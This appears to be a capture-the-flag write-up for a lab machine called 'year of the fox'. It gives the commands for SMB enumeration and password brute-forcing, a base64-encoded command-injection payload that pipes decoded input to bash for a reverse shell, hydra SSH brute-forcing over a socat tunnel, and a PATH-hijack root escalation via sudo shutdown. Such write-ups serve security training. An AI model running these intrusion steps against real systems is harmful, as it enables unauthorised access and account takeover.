# Room name: year of the fox 🦊
Difficulty: hard

🛡️ Initial Reconnaissance
First i scan the room using nmap -sC -sV TARGET_IP and returned:

``` plaintext
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 13:29 PST
Nmap scan report for 10.48.131.233
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
```
## 📂 SMB Enumeration
Accessing the web ask for creds so we will try exploiting the smb. First i check the shares via smb -L TARGET_IP and revealed:
``` plaintext
 Sharename       Type      Comment
 ---------       ----      -------
 yotf            Disk      Fox's Stuff -- keep out!
 IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
```
Using the Metasploit module auxiliary(scanner/smb/smb_enumusers), I identified a valid username: fox.

[!TIP]
Cracking SMB: I used auxiliary(scanner/smb/smb_login) with the rockyou.txt wordlist. After about 5 minutes, I successfully cracked the password.

Once inside the SMB share, I retrieved cipher.txt and creds.txt. However, after hours of attempting to crack these, I realized it was a rabbit hole. I pivoted to enum4linux, which revealed a second user: rascal. I then brute-forced the web login using these two usernames and successfully gained access as rascal.

## 💻 Web Exploitation (RCE via JS Bypass)
Inside Rascal's search system, I noticed a search filter. By checking assets/js/filter.js, I found that the input filtering was only performed on the client-side.

I used Burp Suite to intercept the request and bypass the filter. To achieve Remote Code Execution (RCE), I crafted a reverse shell payload and encoded it in Base64 to avoid detection:
``` json
{
  "target":"\"; echo <YOUR_BASE64_PAYLOAD> | base64 -d | bash \n"
}
```
This granted me a shell, allowing me to capture the first Web Flag.

## 🦊 Privilege Escalation: Rascal to Fox
Running linpeas showed that SSH was active, but only on the localhost. To access it, I used socat for port forwarding. Since socat wasn't on the target, I transferred the file from my VM.

Setup: chmod +x socat

Port Forward:
``` bash
./socat TCP-LISTEN:4445,fork TCP:127.0.0.1:22
```
Attack: I used hydra to brute-force the local SSH service:
``` bash
hydra -l fox -P wordlist.txt ssh://TARGET_IP -s 4445 -t 4
```
I successfully logged in as fox and grabbed the User Flag.

## Privilege Escalation: Fox to Root
Finally, I checked my sudo permissions with sudo -l:
``` bash
(root) NOPASSWD: /usr/sbin/shutdown
```
Since I could run shutdown as root without a password, I exploited a PATH injection vulnerability:
``` bash
# Create a malicious binary in /tmp that spawns a shell
echo /bin/bash > /tmp/poweroff
chmod +x /tmp/poweroff

# Add /tmp to the beginning of the PATH
export PATH=/tmp:$PATH

# Execute shutdown; it will call our /tmp/poweroff instead of the real one
sudo /usr/sbin/shutdown
```
You can also check this link: https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-shutdown-poweroff-privilege-escalation

I gained root access. Interestingly, the flag wasn't in /root/root.txt. After searching the system, I checked rascal's directory for hidden files and found the final root.flag.
